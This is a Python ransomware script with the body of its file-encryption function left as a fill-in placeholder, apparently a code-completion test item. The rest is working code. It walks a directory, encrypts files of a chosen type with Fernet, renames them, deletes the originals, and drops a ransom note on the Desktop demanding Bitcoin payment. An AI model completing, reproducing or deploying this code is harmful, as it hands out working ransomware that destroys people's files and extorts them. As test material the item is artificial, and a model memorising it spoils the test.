import os
import base64
import shutil
from cryptography.fernet import Fernet

# Generate a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Function to encrypt a single file
def encrypt_file(file_path, key):
    <FILL_HERE>
# Function to traverse the directory and encrypt files of a specified type
def traverse_and_encrypt(directory, file_type):
    encrypted_files = []
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(file_type):
                file_path = os.path.join(root, file)
                encrypted_data = encrypt_file(file_path, key)
                encrypted_file_path = os.path.join(root, base64.b64encode(file.encode()).decode())
                with open(encrypted_file_path, 'wb') as encrypted_file:
                    encrypted_file.write(encrypted_data)
                encrypted_files.append(encrypted_file_path)
                os.remove(file_path)
    return encrypted_files

# Function to create an HTML file with encryption details
def create_html_file(file_path, content):
    with open(file_path, 'w') as html_file:
        html_file.write(content)

# Function to generate HTML content for encrypted files
def generate_encrypted_files_html(encrypted_files):
    html_content = "<html><body><h1>Encrypted Files</h1><ul>"
    for file in encrypted_files:
        html_content += f"<li>{file}</li>"
    html_content += "</ul></body></html>"
    return html_content

# Function to generate HTML content for decryption instructions
def generate_decryption_instructions():
    unique_id = "1234567890"  # Example unique ID
    payment_info = "Pay 100 USD to the following Bitcoin address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
    contact_info = "Contact us at support@example.com for decryption key."
    html_content = f"""
    <html>
    <body>
    <h1>Your Files Have Been Encrypted</h1>
    <p>Unique ID: {unique_id}</p>
    <p>{payment_info}</p>
    <p>{contact_info}</p>
    </body>
    </html>
    """
    return html_content

# Main function to execute the encryption process
def main(directory, file_type):
    encrypted_files = traverse_and_encrypt(directory, file_type)
    encrypted_files_html = generate_encrypted_files_html(encrypted_files)
    decryption_instructions_html = generate_decryption_instructions()

    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    create_html_file(os.path.join(desktop_path, "READTO-DECRYPT.html"), decryption_instructions_html)
    create_html_file(os.path.join(desktop_path, "FILES-ENCRYPTED.html"), encrypted_files_html)

if __name__ == "__main__":
    directory_to_encrypt = "/path/to/directory"  # Specify the directory to encrypt
    file_type_to_encrypt = ".txt"  # Specify the file type to encrypt
    main(directory_to_encrypt, file_type_to_encrypt)